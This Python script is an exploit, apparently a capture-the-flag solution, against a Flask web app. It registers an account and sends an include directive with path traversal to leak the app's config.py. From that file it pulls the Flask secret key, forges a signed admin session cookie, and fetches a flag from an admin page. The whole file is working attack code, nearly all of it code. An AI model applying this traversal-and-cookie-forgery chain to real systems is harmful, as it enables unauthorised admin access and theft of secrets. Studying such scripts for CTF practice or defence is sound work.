import hashlib
import html
import random
import re
import string
import sys
from urllib.parse import urlparse

import requests
from flask.sessions import SecureCookieSessionInterface


class SimpleSessionSigner(SecureCookieSessionInterface):
    digest_method = staticmethod(hashlib.sha1)
    key_derivation = "hmac"


def forge_cookie(secret_key, payload):
    signer = SimpleSessionSigner()
    fake_app = type(
        "FakeApp",
        (),
        {
            "secret_key": secret_key,
            "config": {"SECRET_KEY_FALLBACKS": []},
        },
    )()
    serializer = signer.get_signing_serializer(fake_app)
    return serializer.dumps(payload)


def extract_secret(rendered_source):
    source_text = html.unescape(rendered_source)
    match = re.search(
        r'os\.environ\.get\(\s*"RELAYBOARD_SECRET",\s*"([^"]+)"\s*,?\s*\)',
        source_text,
    )
    if not match:
        raise RuntimeError("Could not recover the Flask secret from backend/config.py")
    return match.group(1)


def main():
    base_url = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:5000"
    session = requests.Session()

    username = "operator_" + "".join(random.choices(string.ascii_lowercase, k=6))
    password = "Winter2026!"

    registration = session.post(
        f"{base_url}/register",
        data={"username": username, "password": password},
        allow_redirects=True,
        timeout=10,
    )
    registration.raise_for_status()

    preview = session.post(
        f"{base_url}/preview",
        data={
            "title": "Leak",
            "body": "[[include:../config.py]]",
            "checklist": "noop",
        },
        timeout=10,
    )
    preview.raise_for_status()

    secret_key = extract_secret(preview.text)
    forged = forge_cookie(
        secret_key,
        {"user_id": 1, "username": "dispatcher", "role": "admin"},
    )
    parsed = urlparse(base_url)
    session.cookies.clear(domain=parsed.hostname, path="/", name="session")
    session.cookies.set("session", forged, domain=parsed.hostname, path="/")

    admin_page = session.get(f"{base_url}/admin/archive/1", timeout=10)
    admin_page.raise_for_status()

    flag = re.search(r"flag\{[^}]+\}", admin_page.text)
    if not flag:
        raise RuntimeError("Flag not found in admin archive.")

    print(flag.group(0))


if __name__ == "__main__":
    main()
